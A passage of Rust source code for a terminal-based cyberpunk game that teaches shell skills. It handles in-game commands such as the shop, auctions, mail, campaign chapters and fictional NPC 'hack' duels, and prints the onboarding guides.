                        "shop.catalog\n- script.gremlin.grep : 150 Neon Chips\n- script.pipe.chain : 230 Neon Chips\n- consumable.focus_boost : 90 Neon Chips\n"
                            .to_owned(),
                        0,
                        false,
                    ))
                } else if args.first() == Some(&"buy") {
                    if let Some(sku) = args.get(1) {
                        Ok((format!("Purchased {sku}.\n"), 0, false))
                    } else {
                        Ok(("Usage: shop buy <sku>\n".to_owned(), 1, false))
                    }
                } else {
                    Ok(("Usage: shop list | shop buy <sku>\n".to_owned(), 1, false))
                }
            }
            "auction" => {
                if args.first() == Some(&"list") {
                    let listings = self.app.world.market_snapshot().await;
                    if listings.is_empty() {
                        return Ok(("No active auction listings.\n".to_owned(), 0, false));
                    }

                    let now = chrono::Utc::now();
                    let mut out = String::from(
                        "ID                                   ITEM                  QTY  BID/FLOOR      BUYOUT  ETA   SELLER\n",
                    );
                    for item in listings {
                        let bid = item.highest_bid.unwrap_or(item.start_price);
                        let eta_mins = (item.expires_at - now).num_minutes().max(0);
                        let buyout = item
                            .buyout_price
                            .map(|v| v.to_string())
                            .unwrap_or_else(|| "-".to_owned());
                        out.push_str(&format!(
                            "{} {:<20} {:<4} {:<14} {:<7} {:<5} {}\n",
                            item.listing_id,
                            item.item_sku,
                            item.qty,
                            format!("{bid}/{}", item.start_price),
                            buyout,
                            format!("{eta_mins}m"),
                            item.seller_display
                        ));
                    }
                    Ok((out, 0, false))
                } else if args.first() == Some(&"sell") {
                    if args.len() < 4 {
                        return Ok((
                            "Usage: auction sell <sku> <qty> <start_price> [buyout]\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                    let qty = args[2].parse::<u32>().unwrap_or(1);
                    let start = args[3].parse::<i64>().unwrap_or(25);
                    let buyout = args.get(4).and_then(|v| v.parse::<i64>().ok());
                    let listing = self
                        .app
                        .world
                        .create_listing(player_id, args[1], qty, start, buyout)
                        .await?;
                    Ok((
                        format!("Listing created: {}\n", listing.listing_id),
                        0,
                        false,
                    ))
                } else if args.first() == Some(&"bid") {
                    if args.len() != 3 {
                        return Ok((
                            "Usage: auction bid <listing_id> <amount>\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                    let id = Uuid::parse_str(args[1]).context("invalid listing id")?;
                    let amount = args[2].parse::<i64>().context("invalid amount")?;
                    self.app.world.place_bid(player_id, id, amount).await?;
                    Ok(("Bid placed.\n".to_owned(), 0, false))
                } else if args.first() == Some(&"buyout") {
                    if args.len() != 2 {
                        return Ok(("Usage: auction buyout <listing_id>\n".to_owned(), 1, false));
                    }
                    let id = Uuid::parse_str(args[1]).context("invalid listing id")?;
                    self.app.world.buyout(player_id, id).await?;
                    Ok(("Buyout completed.\n".to_owned(), 0, false))
                } else {
                    Ok(("Usage: auction list|sell|bid|buyout\n".to_owned(), 1, false))
                }
            }
            "chat" => {
                if args.len() < 2 {
                    return Ok((
                        "Usage: chat <global|sector|party> <message>\n".to_owned(),
                        1,
                        false,
                    ));
                }
                let channel = args[0];
                let msg = line.splitn(3, ' ').nth(2).unwrap_or_default();
                let chat = self.app.world.post_chat(player_id, channel, msg).await?;
                Ok((
                    format!(
                        "[{}] {}: {}\n",
                        chat.channel, chat.sender_display, chat.body
                    ),
                    0,
                    false,
                ))
            }
            "mail" => {
                let sub = args.first().copied().unwrap_or("inbox");
                match sub {
                    "inbox" | "" => {
                        let mailbox = self.app.world.get_mailbox(player_id).await?;
                        if mailbox.is_empty() {
                            return Ok(("No messages.\n".to_owned(), 0, false));
                        }
                        let mut out = self.render_section_banner("MAIL INBOX");
                        let unread = mailbox.iter().filter(|m| !m.read).count();
                        out.push_str(&format!(
                            "{} message(s), {} unread\n\n",
                            mailbox.len(),
                            unread
                        ));
                        out.push_str("  #  FROM         STATUS   SUBJECT\n");
                        for (i, msg) in mailbox.iter().enumerate() {
                            let status = if msg.read { "read  " } else { "UNREAD" };
                            out.push_str(&format!(
                                "  {:<3} {:<12} {}   {}\n",
                                i + 1,
                                msg.from,
                                status,
                                msg.subject
                            ));
                        }
                        out.push_str("\nUse `mail read <N>` to read a message.\n");
                        Ok((out, 0, false))
                    }
                    "read" => {
                        let idx: usize = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
                        if idx == 0 {
                            return Ok(("Usage: mail read <N>\n".to_owned(), 1, false));
                        }
                        match self.app.world.read_mail(player_id, idx).await {
                            Ok(msg) => {
                                let mut out =
                                    self.render_section_banner(&format!("MAIL // {}", msg.subject));
                                out.push_str(&format!("From: {}\n\n", msg.from));
                                out.push_str(&msg.body);
                                out.push('\n');
                                Ok((out, 0, false))
                            }
                            Err(e) => Ok((format!("{e}\n"), 1, false)),
                        }
                    }
                    "count" => {
                        let mailbox = self.app.world.get_mailbox(player_id).await?;
                        let unread = mailbox.iter().filter(|m| !m.read).count();
                        Ok((format!("{unread} unread message(s).\n"), 0, false))
                    }
                    _ => Ok(("Usage: mail [inbox|read <N>|count]\n".to_owned(), 1, false)),
                }
            }
            "party" => Ok((
                "party subsystem ready: party invite|join|leave\n".to_owned(),
                0,
                false,
            )),
            "dossier" => {
                if args.is_empty() {
                    // List all unlocked NPCs
                    let npcs = self.app.world.visible_npcs(player_id).await?;
                    if npcs.is_empty() {
                        return Ok((
                            "No dossiers on file yet. Complete missions to discover operatives.\n"
                                .to_owned(),
                            0,
                            false,
                        ));
                    }
                    let mut out = self.render_section_banner("KNOWN OPERATIVES");
                    out.push_str("CALLSIGN     NAME         ROLE\n");
                    for npc in &npcs {
                        out.push_str(&format!(
                            "{:<12} {:<12} {}\n",
                            npc.callsign, npc.name, npc.role
                        ));
                    }
                    out.push_str("\nUse `dossier <callsign>` for full profile.\n");
                    Ok((out, 0, false))
                } else {
                    let callsign = args[0];
                    match self.app.world.lookup_npc(player_id, callsign).await? {
                        Some(npc) => {
                            let mut out =
                                self.render_section_banner(&format!("DOSSIER // {}", npc.callsign));
                            out.push_str(&format!("Name:       {}\n", npc.name));
                            out.push_str(&format!("Callsign:   {}\n", npc.callsign));
                            out.push_str(&format!("Role:       {}\n", npc.role));
                            out.push_str(&format!("Allegiance: {}\n", npc.allegiance));
                            out.push_str(&format!("Status:     {}\n", npc.status));
                            out.push_str(&format!("\n{}\n", npc.bio));
                            Ok((out, 0, false))
                        }
                        None => Ok((
                            "No dossier on file for that callsign.\n".to_owned(),
                            1,
                            false,
                        )),
                    }
                }
            }
            "stance" => {
                match args.first().copied() {
                    Some("pvp") => {
                        self.app
                            .world
                            .set_stance(player_id, CombatStance::Pvp)
                            .await?;
                        Ok((
                            "Combat stance set to PVP. Other players can challenge you.\n"
                                .to_owned(),
                            0,
                            false,
                        ))
                    }
                    Some("pve") => {
                        self.app
                            .world
                            .set_stance(player_id, CombatStance::Pve)
                            .await?;
                        Ok(("Combat stance set to PVE. You cannot be challenged by other players.\n".to_owned(), 0, false))
                    }
                    None => {
                        let stance = self.app.world.get_stance(player_id).await?;
                        let label = match stance {
                            CombatStance::Pvp => "PVP (can be challenged)",
                            CombatStance::Pve => "PVE (safe from challenges)",
                        };
                        Ok((
                            format!(
                                "Current stance: {}\nUse `stance pvp` or `stance pve` to change.\n",
                                label
                            ),
                            0,
                            false,
                        ))
                    }
                    _ => Ok(("Usage: stance [pvp|pve]\n".to_owned(), 1, false)),
                }
            }
            "hack" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: hack <callsign> | hack attack|defend|script|solve\n".to_owned(),
                        1,
                        false,
                    ));
                }
                match args[0] {
                    "attack" | "defend" | "script" => {
                        let Some(duel_id) = self.current_npc_duel else {
                            return Ok((
                                "No active hack. Start with: hack <callsign>\n".to_owned(),
                                1,
                                false,
                            ));
                        };
                        let action = match args[0] {
                            "attack" => world::CombatAction::Attack,
                            "defend" => world::CombatAction::Defend,
                            "script" => {
                                let name = args.get(1).copied().unwrap_or("quickhack").to_owned();
                                world::CombatAction::Script(name)
                            }
                            _ => unreachable!(),
                        };
                        let result = self
                            .app
                            .world
                            .npc_duel_action(duel_id, player_id, action)
                            .await?;
                        if result.ended {
                            self.current_npc_duel = None;
                        }
                        Ok((result.narrative, 0, false))
                    }
                    "solve" => {
                        let Some(duel_id) = self.current_npc_duel else {
                            return Ok(("No active hack session.\n".to_owned(), 1, false));
                        };
                        // Check last command output from shell
                        let last_output = self
                            .shell_state
                            .as_ref()
                            .and_then(|s| s.command_log.values().last().cloned())
                            .unwrap_or_default();
                        let result = self
                            .app
                            .world
                            .npc_duel_solve_bonus(duel_id, player_id, &last_output)
                            .await?;
                        Ok((result, 0, false))
                    }
                    callsign => {
                        if self.mode != Mode::NetCity {
                            return Ok((
                                "Hacking requires NetCity mode. Use `mode netcity` first.\n"
                                    .to_owned(),
                                1,
                                false,
                            ));
                        }
                        if self.current_npc_duel.is_some() {
                            return Ok((
                                "Already in a hack session. Finish it first.\n".to_owned(),
                                1,
                                false,
                            ));
                        }
                        match self.app.world.start_npc_duel(player_id, callsign).await {
                            Ok((duel, info)) => {
                                self.current_npc_duel = Some(duel.duel_id);
                                Ok((info, 0, false))
                            }
                            Err(e) => Ok((format!("{e}\n"), 1, false)),
                        }
                    }
                }
            }
            "history" => {
                let entries = self.app.world.get_history(20).await;
                if entries.is_empty() {
                    return Ok((
                        "NetCity history is empty. No NPCs have been defeated yet.\n".to_owned(),
                        0,
                        false,
                    ));
                }
                let mut out = self.render_section_banner("NETCITY HISTORY LEDGER");
                for entry in &entries {
                    out.push_str(&format!(
                        "  [{}] {}\n",
                        entry.timestamp.format("%Y-%m-%d %H:%M"),
                        entry.event
                    ));
                }
                Ok((out, 0, false))
            }
            "eva" => {
                let sub = args.first().copied().unwrap_or("");
                let (chapter, step) = self.app.world.get_campaign_progress(player_id).await?;
                match sub {
                    "status" => {
                        if chapter == 0 {
                            Ok(("EVA: You haven't started the campaign yet. Run `campaign start`.\n".to_owned(), 0, false))
                        } else if chapter > 7 {
                            Ok(("EVA: Campaign complete. The Ghost Rail conspiracy has been exposed. But Wren's last message suggests this is far from over.\n".to_owned(), 0, false))
                        } else {
                            let titles = ["", "The Blackout", "Surface Anomalies", "The Insider Thread", "The Conspiracy", "Confrontation", "The Reckoning", "The Reply"];
                            let title = titles.get(chapter as usize).unwrap_or(&"Unknown");
                            Ok((format!("EVA: Campaign Chapter {}: \"{}\", Step {}.\nRun `campaign` for objectives.\n", chapter, title, step + 1), 0, false))
                        }
                    }
                    "hint" => {
                        match self
                            .app
                            .world
                            .get_active_mission_hint(player_id)
                            .await?
                        {
                            Some((code, hint)) => {
                                Ok((
                                    format!("EVA: For mission '{}': {}\n", code, hint),
                                    0,
                                    false,
                                ))
                            }
                            None => Ok((
                                "EVA: You have no active missions. Run `missions` and `accept <code>` to pick one.\n"
                                    .to_owned(),
                                0,
                                false,
                            )),
                        }
                    }
                    "lore" => {
                        let lore = match chapter {
                            0 | 1 => "Three nights ago, Ghost Rail lost sync with the rest of NetCity. The official story is a cascading power failure. The logs say otherwise.",
                            2 => "The surface anomalies are piling up. Timestamps that skip, a username that shouldn't exist, a signal in places it shouldn't be. Someone is telling a story with the data — if you know how to read it.",
                            3 => "The insider thread is clear now. This was not an external attack. Someone inside CorpSim had the access, the timing, and the motive. The question is: did they act alone?",
                            4 => "The conspiracy runs deeper than one rogue engineer. CorpSim's board knew. They let it happen. The data went to The Reach. And the 'training sim' you're in? It's their cleanup operation.",
                            5 => "The confrontation phase. The NPCs who have been helping you — and the ones who have been blocking you — are about to face consequences. Your shell skills are your weapons now.",
                            6 => "The reckoning. Every piece of evidence you've gathered comes together. Wren's confession, Argon's orders, Sable's payments, Ferro's suppression. The prosecution file is almost complete.",
                            _ => "The reply. Wren spoke again. Ghost Rail was a distraction. The real story is in Crystal Array. This is not the end — it's the beginning of something bigger.",
                        };
                        Ok((format!("EVA: {}\n", lore), 0, false))
                    }
                    _ => {
                        // Default: context-aware greeting
                        if chapter == 0 {
                            Ok(("EVA: Welcome, operative. I'm the training system AI. Run `campaign start` to begin the Ghost Rail investigation, or `tutorial start` if you're new to the shell.\n".to_owned(), 0, false))
                        } else {
                            let titles = ["", "The Blackout", "Surface Anomalies", "The Insider Thread", "The Conspiracy", "Confrontation", "The Reckoning", "The Reply"];
                            let title = titles.get(chapter as usize).unwrap_or(&"Unknown");
                            Ok((format!("EVA: You're in Chapter {}: \"{}\". Run `eva hint` for mission guidance, `eva lore` for background, or `eva status` for progress.\n", chapter, title), 0, false))
                        }
                    }
                }
            }
            "campaign" => {
                let sub = args.first().copied().unwrap_or("");
                let (chapter, step) = self.app.world.get_campaign_progress(player_id).await?;
                match sub {
                    "start" => {
                        if chapter == 0 {
                            self.app
                                .world
                                .set_campaign_progress(player_id, 1, 0)
                                .await?;
                            let mut out =
                                self.render_section_banner("CAMPAIGN // CHAPTER 1: THE BLACKOUT");
                            out.push_str("EVA: Welcome to the Ghost Rail investigation.\n");
                            out.push_str(
                                "This campaign will guide you through the full story in order.\n\n",
                            );
                            out.push_str("Chapter 1 objectives:\n");
                            out.push_str(
                                "  1. Complete tutorial missions (nav-101 through pipe-101)\n",
                            );
                            out.push_str("  2. Accept and complete keys-vault\n\n");
                            out.push_str("Run `campaign next` after completing each objective.\n");
                            Ok((out, 0, false))
                        } else {
                            let titles = [
                                "",
                                "The Blackout",
                                "Surface Anomalies",
                                "The Insider Thread",
                                "The Conspiracy",
                                "Confrontation",
                                "The Reckoning",
                                "The Reply",
                            ];
                            let title = titles.get(chapter as usize).unwrap_or(&"Unknown");
                            Ok((format!("Campaign already in progress: Chapter {} \"{}\", Step {}.\nRun `campaign` to see objectives or `campaign next` to advance.\n", chapter, title, step + 1), 0, false))
                        }
                    }
                    "next" => {
                        if chapter == 0 {
                            return Ok(("Run `campaign start` first.\n".to_owned(), 1, false));
                        }
                        if chapter > 7 {
                            return Ok((
                                "Campaign complete! The Ghost Rail conspiracy has been exposed.\n"
                                    .to_owned(),
                                0,
                                false,
                            ));
                        }
                        // Simple advancement — increment step, overflow to next chapter
                        let steps_per_chapter: &[u8] = &[0, 5, 5, 5, 5, 3, 4, 3];
                        let max_steps = steps_per_chapter
                            .get(chapter as usize)
                            .copied()
                            .unwrap_or(4);
                        if step + 1 >= max_steps {
                            let next_ch = chapter + 1;
                            self.app
                                .world
                                .set_campaign_progress(player_id, next_ch, 0)
                                .await?;
                            if next_ch > 7 {
                                let mut out = self.render_section_banner("CAMPAIGN COMPLETE");
                                out.push_str(
                                    "EVA: The Ghost Rail conspiracy has been fully exposed.\n",
                                );
                                out.push_str("Wren's confession, Argon's cover-up, The Reach's payment — all documented.\n");
                                out.push_str("But Wren's final message changes everything. Crystal Array awaits.\n\n");
                                out.push_str("Thank you, operative. You did what a city full of people could not.\n");
                                Ok((out, 0, false))
                            } else {
                                let titles = [
                                    "",
                                    "The Blackout",
                                    "Surface Anomalies",
                                    "The Insider Thread",
                                    "The Conspiracy",
                                    "Confrontation",
                                    "The Reckoning",
                                    "The Reply",
                                ];
                                let title = titles.get(next_ch as usize).unwrap_or(&"Unknown");
                                let mut out = self.render_section_banner(&format!(
                                    "CAMPAIGN // CHAPTER {}: {}",
                                    next_ch,
                                    title.to_uppercase()
                                ));
                                out.push_str(&format!("EVA: Chapter {} begins.\n", next_ch));
                                out.push_str("Run `campaign` to see your new objectives.\n");
                                Ok((out, 0, false))
                            }
                        } else {
                            self.app
                                .world
                                .set_campaign_progress(player_id, chapter, step + 1)
                                .await?;
                            Ok((format!("Campaign advanced to Chapter {}, Step {}.\nRun `campaign` to see objectives.\n", chapter, step + 2), 0, false))
                        }
                    }
                    _ => {
                        // Show current objectives
                        if chapter == 0 {
                            return Ok((
                                "Campaign not started. Run `campaign start` to begin.\n".to_owned(),
                                0,
                                false,
                            ));
                        }
                        if chapter > 7 {
                            return Ok((
                                "Campaign complete! Run `history` to see the NetCity ledger.\n"
                                    .to_owned(),
                                0,
                                false,
                            ));
                        }
                        let titles = [
                            "",
                            "The Blackout",
                            "Surface Anomalies",
                            "The Insider Thread",
                            "The Conspiracy",
                            "Confrontation",
                            "The Reckoning",
                            "The Reply",
                        ];
                        let title = titles.get(chapter as usize).unwrap_or(&"Unknown");
                        let mut out = self.render_section_banner(&format!(
                            "CAMPAIGN // CHAPTER {}: {}",
                            chapter,
                            title.to_uppercase()
                        ));
                        out.push_str(&format!("Step {}\n\n", step + 1));
                        match chapter {
                            1 => out.push_str("Objectives: Complete tutorial missions (nav-101 → pipe-101) and keys-vault.\n"),
                            2 => out.push_str("Objectives: Complete rivet-log, nix-signal, timestamp-gap, ghost-user, first-clue.\n"),
                            3 => out.push_str("Objectives: Complete access-pattern, purged-comms, key-rotation, kestrel-brief, ferro-lockdown.\n"),
                            4 => out.push_str("Objectives: Complete wren-profile, exfil-trace, reach-intercept, config-diff, corpsim-memo.\n"),
                            5 => out.push_str("Objectives: Hack Dusk (hack DSK), Ferro (hack FER), Argon (hack ARG).\n"),
                            6 => out.push_str("Objectives: Complete decrypt-wren, prove-corpsim, kestrel-verdict, final-report.\n"),
                            7 => out.push_str("Objectives: Hack Wren (hack WREN), complete wren-reply, crucible-offer.\n"),
                            _ => out.push_str("Unknown chapter.\n"),
                        }
                        out.push_str("\nRun `campaign next` after completing each objective.\n");
                        Ok((out, 0, false))
                    }
                }
            }
            "mode" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: mode <training|netcity|redline> [--no-flash]\n".to_owned(),
                        1,
                        false,
                    ));
                }
                let target = match args[0] {
                    "training" => Mode::Training,
                    "netcity" => Mode::NetCity,
                    "redline" => Mode::Redline,
                    _ => {
                        return Ok((
                            "Unknown mode. Use training|netcity|redline\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                };

                let no_flash = args.contains(&"--no-flash");
                let old = self.mode.clone();
                self.flash_enabled = if no_flash { false } else { self.flash_enabled };

                if let Err(err) = self
                    .app
                    .world
                    .mode_switch(player_id, target.clone(), Some(self.flash_enabled))
                    .await
                {
                    return Ok((format!("{err}\n"), 1, false));
                }

                if target == Mode::Redline {
                    self.redline_until = Some(
                        Instant::now() + Duration::from_secs(self.app.cfg.redline.duration_seconds),
                    );
                } else {
                    self.redline_until = None;
                }

                self.mode = target.clone();
                let mut out = String::new();
                out.push_str(&mode_switch_banner(old, target.clone()));
                out.push_str(&self.render_mode_banner(target.clone()));
                out.push('\n');
                out.push_str(lore_message(target));
                out.push('\n');
                Ok((out, 0, false))
            }
            "keyvault" => {
                if args.first() == Some(&"register") {
                    let maybe_line = line.strip_prefix("keyvault register").unwrap_or("").trim();
                    if maybe_line.is_empty() {
                        self.pending_keyvault = true;
                        return Ok((
                            "Paste your full public key line now (ssh-ed25519 AAAA... comment):\n"
                                .to_owned(),
                            0,
                            false,
                        ));
                    }
                    match self.app.world.register_key(player_id, maybe_line).await {
                        Ok(fp) => Ok((format!("Key registered: {fp}\n"), 0, false)),
                        Err(err) => Ok((format!("Key registration failed: {err}\n"), 1, false)),
                    }
                } else {
                    Ok((
                        "Usage: keyvault register [ssh-public-key-line]\n".to_owned(),
                        1,
                        false,
                    ))
                }
            }
            "settings" => {
                if args.len() == 2 && args[0] == "flash" {
                    self.flash_enabled = args[1] != "off";
                    Ok((
                        format!(
                            "Flash effects {}\n",
                            if self.flash_enabled { "ON" } else { "OFF" }
                        ),
                        0,
                        false,
                    ))
                } else {
                    Ok(("Usage: settings flash <on|off>\n".to_owned(), 1, false))
                }
            }
            "status" => {
                let player = self
                    .app
                    .world
                    .get_player(player_id)
                    .await
                    .ok_or_else(|| anyhow!("unknown player"))?;
                let gate = self
                    .app
                    .world
                    .netcity_gate_reason(player_id, &self.offered_fingerprints)
                    .await?;
                let mut achievements = player.achievements.iter().cloned().collect::<Vec<_>>();
                achievements.sort();
                let ach = if achievements.is_empty() {
                    "none".to_owned()
                } else {
                    achievements.join(", ")
                };
                let gate_status = gate.clone().unwrap_or_else(|| "UNLOCKED".to_owned());
                let streak = player
                    .streak_day
                    .map(|d| d.to_string())
                    .unwrap_or("-".to_owned());
                let rep_pct = player.reputation.clamp(0, 100) as u8;
                let death_pct = if player.deaths >= 3 {
                    0
                } else {
                    (((3 - player.deaths) as f32 / 3.0) * 100.0).round() as u8
                };
                let gate_pct = if gate.is_none() { 100 } else { 20 };

                let mut out = self.render_section_banner("PLAYER STATUS");
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Alias",
                    &player.private_alias,
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Display",
                    &player.display_name,
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Tier/Mode",
                    &format!("{:?} / {:?}", player.tier, player.mode),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Wallet",
                    &format!("{} Neon Chips", player.wallet),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Reputation",
                    &format!(
                        "{} {}",
                        player.reputation,
                        progress_meter(self.mode.clone(), rep_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Survival",
                    &format!(
                        "{} deaths {}",
                        player.deaths,
                        progress_meter(self.mode.clone(), death_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "NetCity Gate",
                    &format!(
                        "{} {}",
                        gate_status,
                        progress_meter(self.mode.clone(), gate_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Daily Streak",
                    &format!("{} (last claim: {})", player.streak, streak),
                ));
                out.push_str(&key_value_line(self.mode.clone(), "Achievements", &ach));

                Ok((out, 0, false))
            }
            "events" => {
                let feed = self
                    .app
                    .world
                    .world_events_snapshot(chrono::Utc::now())
                    .await;
                if feed.is_empty() {
                    return Ok(("No upcoming world events.\n".to_owned(), 0, false));
                }
                let now = chrono::Utc::now();
                let mut out = self.render_section_banner("WORLD EVENTS");
                for event in feed {
                    let status = if event.active {
                        format!(
                            "ACTIVE (ends in {}m)",
                            (event.ends_at - now).num_minutes().max(0)
                        )
                    } else {
                        format!(
                            "UPCOMING (starts in {}m)",
                            (event.starts_at - now).num_minutes().max(0)
                        )
                    };
                    out.push_str(&format!(
                        "- {} :: {} :: {}\n",
                        event.sector, event.title, status
                    ));
                }
                Ok((out, 0, false))
            }
            "scripts" => {
                if args.first() == Some(&"market") || args.is_empty() {
                    let mut out = self.render_section_banner("SCRIPT MARKET");
                    for entry in script_market() {
                        out.push_str(&format!(
                            "- {:<12} {}{}\n",
                            entry.name, entry.description, RESET
                        ));
                    }
                    out.push_str("Run with: scripts run <name>\n");
                    return Ok((out, 0, false));
                }

                if args.first() != Some(&"run") {
                    return Ok((
                        "Usage: scripts market | scripts run <name>\n".to_owned(),
                        1,
                        false,
                    ));
                }

                let Some(name) = args.get(1).copied() else {
                    return Ok(("Usage: scripts run <name>\n".to_owned(), 1, false));
                };
                let Some(entry) = script_market().iter().find(|entry| entry.name == name) else {
                    let names = script_market()
                        .iter()
                        .map(|entry| entry.name)
                        .collect::<Vec<_>>()
                        .join(", ");
                    return Ok((format!("Unknown script. Available: {names}\n"), 1, false));
                };

                if let Some(until) = self.script_cooldown_until {
                    let now = Instant::now();
                    if now < until {
                        let remain = until.duration_since(now).as_secs().max(1);
                        return Ok((
                            format!("Script sandbox cooling down. Retry in {remain}s\n"),
                            1,
                            false,
                        ));
                    }
                }

                let log_content = self
                    .shell_state
                    .as_ref()
                    .and_then(|shell| {
                        shell
                            .vfs
                            .read_file(&shell.cwd, "/logs/neon-gateway.log")
                            .ok()
                    })
                    .unwrap_or_default();
                let mut virtual_files = BTreeMap::new();
                virtual_files.insert("/logs/neon-gateway.log".to_owned(), log_content);
                let script_out = self
                    .app
                    .script
                    .run(
                        entry.source,
                        ScriptContext {
                            visible_nodes: vec![
                                "neon-bazaar-gw".to_owned(),
                                "ghost-rail".to_owned(),
                                "vault-sat-9".to_owned(),
                            ],
                            virtual_files,
                        },
                    )
                    .await
                    .map_err(|e| anyhow!("script execution failed: {e}"))?;

                self.script_cooldown_until = Some(Instant::now() + Duration::from_secs(8));
                let mut out = format!("Script {} complete.\n", entry.name);
                if script_out.output.trim().is_empty() {
                    out.push_str("(no output)\n");
                } else {
                    out.push_str(&script_out.output);
                    if !out.ends_with('\n') {
                        out.push('\n');
                    }
                }
                Ok((out, 0, false))
            }
            "daily" => {
                let reward = self
                    .app
                    .world
                    .claim_daily_reward(player_id, chrono::Utc::now())
                    .await?;
                Ok((format!("Daily reward: +{reward} Neon Chips\n"), 0, false))
            }
            "tier" => {
                let Some(raw) = args.first() else {
                    return Ok(("Usage: tier <noob|gud|hardcore>\n".to_owned(), 1, false));
                };
                let Some(tier) = ExperienceTier::parse(raw) else {
                    return Ok((
                        "Invalid tier. Use: noob, gud, hardcore\n".to_owned(),
                        1,
                        false,
                    ));
                };
                self.app.world.set_tier(player_id, tier).await?;
                Ok((
                    "Tier set. Available tiers: Noob, Gud, Hardcore\n".to_owned(),
                    0,
                    false,
                ))
            }
            "pvp" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: pvp roster | pvp challenge <username> | pvp attack|defend|script <name>\n"
                            .to_owned(),
                        1,
                        false,
                    ));
                }
                match args[0] {
                    "roster" => {
                        let roster = self.app.world.roster().await;
                        Ok((format!("{}\n", roster.join("\n")), 0, false))
                    }
                    "challenge" => {
                        let Some(target_name) = args.get(1) else {
                            return Ok(("Usage: pvp challenge <username>\n".to_owned(), 1, false));
                        };
                        let Some(target) =
                            self.app.world.resolve_player_by_username(target_name).await
                        else {
                            return Ok(("Target not found\n".to_owned(), 1, false));
                        };
                        let duel = self.app.world.start_duel(player_id, target.id).await?;
                        self.current_duel = Some(duel.duel_id);
                        Ok((
                            format!("Duel started vs {}\n", target.display_name),
                            0,
                            false,
                        ))
                    }
                    "attack" | "defend" | "script" => {
                        let Some(duel_id) = self.current_duel else {
                            return Ok((
                                "No active duel. Start with: pvp challenge <username>\n".to_owned(),
                                1,
                                false,
                            ));
                        };
                        let action = match args[0] {
                            "attack" => CombatAction::Attack,
                            "defend" => CombatAction::Defend,
                            "script" => {
                                let name = args.get(1).copied().unwrap_or("quickhack").to_owned();
                                CombatAction::Script(name)
                            }
                            _ => unreachable!(),
                        };
                        let outcome = self
                            .app
                            .world
                            .duel_action(duel_id, player_id, action)
                            .await?;
                        if outcome.ended {
                            self.current_duel = None;
                        }
                        Ok((format!("{}\n", outcome.narrative), 0, false))
                    }
                    _ => Ok(("Unknown pvp command\n".to_owned(), 1, false)),
                }
            }
            "relay" => {
                let body = line.strip_prefix("relay").unwrap_or("").trim();
                if body.is_empty() {
                    return Ok(("Usage: relay <message>\n".to_owned(), 1, false));
                }
                if !self
                    .app
                    .world
                    .player_has_completed_hidden_mission(player_id)
                    .await
                {
                    return Ok((
                        "Relay locked. Discover deeper city layers first.\n".to_owned(),
                        1,
                        false,
                    ));
                }
                self.app
                    .world
                    .relay_to_admin_via_telegram(player_id, body)
                    .await?;
                Ok((
                    "Message relayed via secure bot channel.\n".to_owned(),
                    0,
                    false,
                ))
            }
            _ => Ok((
                "Unknown game command. Run help or guide.\n".to_owned(),
                127,
                false,
            )),
        }
    }

    fn quickstart_guide(&self) -> String {
        let mut out = self.render_section_banner("FIRST SESSION PLAYBOOK");
        out.push_str(
            "1. tutorial start        (guided 6-step walkthrough — new to shells? start here)\n",
        );
        out.push_str(
            "2. tutorial next         (advance through each step after running commands)\n",
        );
        out.push_str("3. guide shell           (or cat /missions/rookie-ops.txt)\n");
        out.push_str("4. briefing\n");
        out.push_str("5. missions              (tutorial-track missions give 5 rep each)\n");
        out.push_str("6. accept keys-vault\n");
        out.push_str("6. keyvault register\n");
        out.push_str("7. submit keys-vault\n");
        out.push_str("8. briefing pipes-101   (or log-hunt|dedupe-city)\n");
        out.push_str("9. accept pipes-101     (or the starter mission you want)\n");
        out.push_str("10. submit pipes-101    (or the starter mission you accepted)\n");
        out.push_str("11. gate\n");
        out.push_str("12. mode netcity\n");
        out.push('\n');
        out.push_str("If bash feels rusty\n");
        out.push_str("  cat /missions/rookie-ops.txt\n");
        out.push_str("  cat /data/lore/field-manual.txt\n");
        out.push('\n');
        out.push_str("Daily loop after unlock\n");
        out.push_str(
            "  daily -> events -> auction list -> scripts market -> pvp roster -> leaderboard\n",
        );
        out.push('\n');
        out.push_str("Use `guide full` for a deeper walkthrough of progression systems.\n");
        out
    }

    fn full_gameplay_guide(&self) -> String {
        let mut out = self.render_section_banner("GAMEPLAY GUIDE // FULL");
        out.push_str("Onboarding and unlock flow\n");
        out.push_str("  - Start interactive tutorial: tutorial start (6 guided steps)\n");
        out.push_str("  - Advance tutorial steps: tutorial next (after running each command)\n");
        out.push_str("  - Try tutorial missions: nav-101, read-101, echo-101, grep-101, pipe-101 (5 rep each)\n");
        out.push_str("  - Get shell basics: guide shell\n");
        out.push_str("  - Read story + hints: briefing\n");
        out.push_str("  - Read shell cheat sheet: cat /missions/rookie-ops.txt\n");
        out.push_str("  - Inspect board: missions\n");
        out.push_str("  - Accept required: accept keys-vault\n");
        out.push_str("  - Register key: keyvault register\n");
        out.push_str("  - Complete mission: submit keys-vault\n");
        out.push_str(
            "  - Complete one starter mission: pipes-101|finder|redirect-lab|log-hunt|dedupe-city\n",
        );
        out.push_str("  - Get mission-specific help: briefing <mission-code>\n");
        out.push_str("  - Verify requirements: gate\n");
        out.push_str("  - Enter multiplayer: mode netcity\n");
        out.push('\n');
        out.push_str("Bash ramp for new players\n");
        out.push_str("  - Read files with cat, head, tail, or less\n");
        out.push_str("  - Use grep to filter lines by a word or pattern\n");
        out.push_str("  - Use | to pass output to the next command\n");
        out.push_str("  - Use > to save output, and >> to append to a file\n");
        out.push_str("  - If a pipeline feels too long, run each step separately first\n");
        out.push('\n');
        out.push_str("Advanced missions (post-NetCity)\n");
